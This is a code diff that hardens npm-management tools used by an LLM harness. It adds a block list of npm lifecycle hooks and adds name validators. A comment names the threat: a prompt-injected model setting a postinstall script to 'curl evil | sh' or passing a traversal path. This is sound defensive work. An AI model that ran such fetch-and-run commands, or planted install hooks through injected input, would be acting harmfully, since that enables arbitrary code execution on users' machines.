@@ -54,6 +54,92 @@ export interface NpmOpResult {
   error?: string;
 }
 
+// ── Name + script validators ─────────────────────────────────────────
+//
+// Review fix #1 (CRITICAL): validate caller-supplied identifiers.
+// Without these, `addDependency({name: "../../etc/passwd"})` would
+// pass the string straight to `npm install`, and
+// `setScript({name: "postinstall", command: "curl evil | sh"})`
+// followed by an `add_dependency` triggering install would execute
+// arbitrary shell commands via npm's lifecycle hooks. Even though
+// our LLM is "trusted," its inputs include model-generated test
+// source — a prompt-injection in that source can drive these tools.
+
+/** npm's own package-name validation, slightly tightened: kebab-case
+ *  segments, optional `@scope/` prefix, max 214 chars (npm's cap). */
+const NPM_NAME_RE =
+  /^(?:@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/;
+
+/** Lifecycle scripts npm executes during install. The model picking
+ *  any of these gives it arbitrary code execution; refuse them. */
+const FORBIDDEN_SCRIPT_NAMES = new Set([
+  "preinstall",
+  "install",
+  "postinstall",
+  "preuninstall",
+  "uninstall",
+  "postuninstall",
+  "prepublish",
+  "prepublishOnly",
+  "prepare",
+  "prepack",
+  "postpack",
+  "publish",
+  "postpublish",
+  "preversion",
+  "version",
+  "postversion",
+  "preshrinkwrap",
+  "shrinkwrap",
+  "postshrinkwrap",
+  "prerestart",
+  "restart",
+  "postrestart",
+  "prestart",
+  "start",
+  "poststart",
+  "prestop",
+  "stop",
+  "poststop",
+]);
+
+function validateNpmName(name: string): { ok: true } | { ok: false; error: string } {
+  if (typeof name !== "string" || name.length === 0) {
+    return { ok: false, error: "name must be a non-empty string" };
+  }
+  if (name.length > 214) {
+    return { ok: false, error: "name exceeds npm's 214-char cap" };
+  }
+  if (!NPM_NAME_RE.test(name)) {
+    return {
+      ok: false,
+      error: `name must match npm package-name format (kebab-case, optional @scope/, no traversal): ${JSON.stringify(name)}`,
+    };
+  }
+  return { ok: true };
+}
+
+const SCRIPT_NAME_RE = /^[a-z][a-z0-9:_-]*$/;
+
+function validateScriptName(name: string): { ok: true } | { ok: false; error: string } {
+  if (typeof name !== "string" || name.length === 0) {
+    return { ok: false, error: "script name must be a non-empty string" };
+  }
+  if (FORBIDDEN_SCRIPT_NAMES.has(name)) {
+    return {
+      ok: false,
+      error: `script name "${name}" is an npm lifecycle hook and is not allowed (could execute on install)`,
+    };
+  }
+  if (!SCRIPT_NAME_RE.test(name)) {
+    return {
+      ok: false,
+      error: `script name must match /^[a-z][a-z0-9:_-]*$/ (got ${JSON.stringify(name)})`,
+    };
+  }
+  return { ok: true };
+}
+
 /**
  * Add a dependency. `which: "runtime"` lands in `dependencies`,
  * `which: "dev"` in `devDependencies`. Re-runs npm install on
@@ -70,6 +156,18 @@ export async function addDependency(
     which: "runtime" | "dev";
   },
 ): Promise<NpmOpResult> {
+  const nameCheck = validateNpmName(input.name);
+  if (!nameCheck.ok) {
+    return { ok: false, installOk: false, installRan: false, error: nameCheck.error };
+  }
+  if (typeof input.version !== "string" || input.version.length === 0) {
+    return {
+      ok: false,
+      installOk: false,
+      installRan: false,
+      error: "version must be a non-empty string",
+    };
+  }
   const pkgPath = path.join(input.outDir, "package.json");
   const loaded = await loadPkg(pkgPath);
   if (!loaded.ok) return { ok: false, installOk: false, installRan: false, error: loaded.error };
@@ -97,6 +195,10 @@ export async function addDependency(
 export async function removeDependency(
   input: NpmOpInput & { name: string },
 ): Promise<NpmOpResult> {
+  const nameCheck = validateNpmName(input.name);
+  if (!nameCheck.ok) {
+    return { ok: false, installOk: false, installRan: false, error: nameCheck.error };
+  }
   const pkgPath = path.join(input.outDir, "package.json");
   const loaded = await loadPkg(pkgPath);
   if (!loaded.ok) return { ok: false, installOk: false, installRan: false, error: loaded.error };
@@ -130,6 +232,18 @@ export async function removeDependency(
 export async function setScript(
   input: NpmOpInput & { name: string; command: string },
 ): Promise<NpmOpResult> {
+  const nameCheck = validateScriptName(input.name);
+  if (!nameCheck.ok) {
+    return { ok: false, installOk: false, installRan: false, error: nameCheck.error };
+  }
+  if (typeof input.command !== "string" || input.command.length === 0) {
+    return {
+      ok: false,
+      installOk: false,
+      installRan: false,
+      error: "command must be a non-empty string",
+    };
+  }
   const pkgPath = path.join(input.outDir, "package.json");
   const loaded = await loadPkg(pkgPath);
   if (!loaded.ok) return { ok: false, installOk: false, installRan: false, error: loaded.error };
@@ -164,6 +278,16 @@ export async function setScript(
 export async function npmRun(
   input: NpmOpInput & { script: string; timeoutMs?: number },
 ): Promise<NpmOpResult & { exitCode: number | null }> {
+  const nameCheck = validateScriptName(input.script);
+  if (!nameCheck.ok) {
+    return {
+      ok: false,
+      installOk: false,
+      installRan: false,
+      error: nameCheck.error,
+      exitCode: null,
+    };
+  }
   const pkgPath = path.join(input.outDir, "package.json");
   const loaded = await loadPkg(pkgPath);
   if (!loaded.ok) {
@@ -235,9 +359,13 @@ async function loadPkg(
 }
 
 async function writePkg(pkgPath: string, pkg: PackageJson): Promise<void> {
-  // Atomic write via temp + rename — guards against half-written
-  // package.json if the harness is killed mid-write.
-  const tmp = pkgPath + ".tmp";
+  // Atomic write via temp + rename. Review fix #5: unique suffix
+  // per call so concurrent harness processes pointing at the same
+  // outDir don't clobber each other's temp file mid-write — one
+  // rename then wins and the other writes garbage onto package.json.
+  const { randomBytes } = await import("node:crypto");
+  const suffix = `${process.pid}.${Date.now()}.${randomBytes(4).toString("hex")}`;
+  const tmp = `${pkgPath}.${suffix}.tmp`;
   await writeFile(tmp, JSON.stringify(pkg, null, 2) + "\n", "utf-8");
   await rename(tmp, pkgPath);
 }
